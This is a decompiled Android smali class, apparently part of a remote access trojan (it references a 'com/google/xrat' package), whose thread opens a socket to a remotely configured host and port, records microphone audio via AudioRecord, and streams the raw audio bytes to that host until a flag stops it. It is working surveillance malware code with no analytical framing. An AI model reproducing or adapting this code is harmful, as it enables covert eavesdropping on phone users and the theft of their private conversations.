.class final Lcom/v1/j;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lcom/v1/StreamService;

.field private b:Ljava/lang/String;

.field private c:Landroid/media/AudioRecord;

.field private d:I

.field private e:[B

.field private f:I


# direct methods
.method public constructor <init>(Lcom/v1/StreamService;Ljava/lang/String;)V
    .locals 2

    const/4 v1, 0x0

    iput-object p1, p0, Lcom/v1/j;->a:Lcom/v1/StreamService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    const-string v0, ""

    iput-object v0, p0, Lcom/v1/j;->b:Ljava/lang/String;

    iput v1, p0, Lcom/v1/j;->d:I

    iput v1, p0, Lcom/v1/j;->f:I

    iput-object p2, p0, Lcom/v1/j;->b:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 9

    const/4 v8, 0x0

    :try_start_0
    new-instance v7, Ljava/net/Socket;

    iget-object v0, p0, Lcom/v1/j;->a:Lcom/v1/StreamService;

    iget-object v0, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    iget-object v1, p0, Lcom/v1/j;->a:Lcom/v1/StreamService;

    iget v1, v1, Lcom/v1/StreamService;->b:I

    invoke-direct {v7, v0, v1}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/net/ConnectException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v7}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-direct {v6, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_1
    .catch Ljava/net/ConnectException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    const/16 v0, 0xde

    :try_start_2
    invoke-static {v0}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->write([B)V

    iget-object v0, p0, Lcom/v1/j;->b:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    array-length v0, v0

    int-to-short v0, v0

    invoke-static {v0}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->write([B)V

    iget-object v0, p0, Lcom/v1/j;->b:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->write([B)V

    const/16 v0, 0x1f40

    const/16 v1, 0x10

    const/4 v2, 0x2

    invoke-static {v0, v1, v2}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v0

    iput v0, p0, Lcom/v1/j;->d:I

    new-instance v0, Landroid/media/AudioRecord;

    const/4 v1, 0x1

    const/16 v2, 0x1f40

    const/16 v3, 0x10

    const/4 v4, 0x2

    iget v5, p0, Lcom/v1/j;->d:I

    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V

    iput-object v0, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    iget v0, p0, Lcom/v1/j;->d:I

    new-array v0, v0, [B

    iput-object v0, p0, Lcom/v1/j;->e:[B

    iget-object v0, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->startRecording()V

    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/v1/j;->a:Lcom/v1/StreamService;

    iget-boolean v0, v0, Lcom/v1/StreamService;->d:Z
    :try_end_2
    .catch Ljava/net/ConnectException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_5

    if-nez v0, :cond_1

    move-object v0, v6

    move-object v1, v7

    :goto_1
    iget-object v2, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    invoke-virtual {v2}, Landroid/media/AudioRecord;->stop()V

    iget-object v2, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    invoke-virtual {v2}, Landroid/media/AudioRecord;->release()V

    iput-object v8, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    :try_start_3
    invoke-virtual {v0}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    :goto_2
    return-void

    :cond_1
    :try_start_4
    iget-object v0, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    iget-object v1, p0, Lcom/v1/j;->e:[B

    const/4 v2, 0x0

    iget v3, p0, Lcom/v1/j;->d:I

    invoke-virtual {v0, v1, v2, v3}, Landroid/media/AudioRecord;->read([BII)I

    move-result v0

    iput v0, p0, Lcom/v1/j;->f:I

    iget v0, p0, Lcom/v1/j;->f:I

    if-lez v0, :cond_0

    iget-object v0, p0, Lcom/v1/j;->e:[B

    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->write([B)V
    :try_end_4
    .catch Ljava/net/ConnectException; {:try_start_4 .. :try_end_4} :catch_0
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_5

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    :catch_1
    move-exception v0

    move-object v2, v0

    move-object v1, v8

    move-object v0, v8

    :goto_3
    :try_start_5
    iget-object v3, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    invoke-virtual {v3}, Landroid/media/AudioRecord;->stop()V

    iget-object v3, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    invoke-virtual {v3}, Landroid/media/AudioRecord;->release()V

    const/4 v3, 0x0

    iput-object v3, p0, Lcom/v1/j;->c:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_2

    :goto_4
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v3

    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_4

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2

    :catch_4
    move-exception v0

    move-object v2, v0

    move-object v1, v7

    move-object v0, v8

    goto :goto_3

    :catch_5
    move-exception v0

    move-object v2, v0

    move-object v1, v7

    move-object v0, v6

    goto :goto_3
.end method
